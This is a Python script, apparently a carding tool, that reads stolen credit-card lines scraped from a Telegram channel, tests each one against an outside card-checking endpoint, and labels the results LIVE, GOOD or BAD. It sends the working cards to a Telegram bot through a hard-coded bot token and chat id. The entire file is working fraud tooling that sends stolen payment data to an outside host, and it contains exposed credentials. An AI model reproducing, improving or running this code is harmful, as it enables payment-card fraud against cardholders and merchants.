#THIS_SCRIPT_CODED_BY_MIDO
#THIS_PAID_VERSION
#FUCK_U_IF_YOU_WANT_TO_EDIT
import os
'''
     PLEASE REMOVE '#' TAGS IF YOU FOUND PROBLEM LIKE , MODULE NOT FOUND
'''
os.system("pip install --upgrade pip")
os.system("clear")
os.system("pip install bs4")
os.system("clear")
os.system("pip install requests")
os.system("clear")
os.system("pip install html5lib")
os.system("clear")
import requests as r
import json
import urllib.request as req
from bs4 import BeautifulSoup
import html5lib
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
print("  ")

#sk = input("[*] INPUT SK_LIVE KEY PLEASE : ")
print("  ")
token = "1704872580:AAH67Q5uJwlrF8Tfj5T05D3laLLb3b_Nqy0"
print("  ")
token2 = "1704872580:AAH67Q5uJwlrF8Tfj5T05D3laLLb3b_Nqy0"
print("  ")
id = "1136754989"
print("  ")
chanil = sys.argv[1]
chanil = chanil.replace('@','')
a_file = open('Scraped1/%s_Scrapped.txt'% chanil, "r")
list_of_lists = []
line_count = 0
for line in a_file:

  stripped_line = line.strip()
  line_list = stripped_line.split()
  list_of_lists.append(line_list)
  if line != "\n":
  	line_count += 1
for nm in range(line_count):
	s =list_of_lists[nm]
	cc = ' '.join([str(elem) for elem in s])
	session = r.Session()
	session.verify = False
	send=session.get(url="https://utsfv.com/pv/ck.php?lista=" + cc + "&sec=undefined&amount=1".replace(' ','%').replace("|","%7C"))
	from bs4 import BeautifulSoup
	soup = BeautifulSoup(send.text)
	text = soup.get_text()
	import urllib
	if  "#CHARGED" in send.text  and  "http" not in send.text or "card_error" in send.text:

		message = urllib.parse.quote_plus(text)	
		print(G + "LIVE ====> "+cc)
		so=session.get("https://api.telegram.org/bot"+token2+"/sendMessage?text="+message+"&chat_id="+id)
	
	elif '#CCN' in send.text or "#CVV" in send.text:
		message = urllib.parse.quote_plus(text)
		print(O + "GOOD ====> "+ cc)
		so=session.get("https://api.telegram.org/bot"+token+"/sendMessage?text="+message+"&chat_id="+id)
		print(so.text)
	else:
		print(R + "BAD ====> "+cc)
		

